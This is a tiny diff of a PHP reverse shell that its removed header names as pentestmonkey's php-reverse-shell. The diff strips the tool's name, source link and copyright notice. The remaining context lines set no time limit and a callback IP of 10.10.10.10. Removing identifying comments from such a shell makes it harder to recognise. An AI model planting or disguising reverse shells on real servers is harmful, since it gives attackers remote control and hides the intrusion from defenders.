@@ -1,7 +1,4 @@
 <?php
-// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
-// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
-
 set_time_limit (0);
 $VERSION = "1.0";
 $ip = '10.10.10.10';
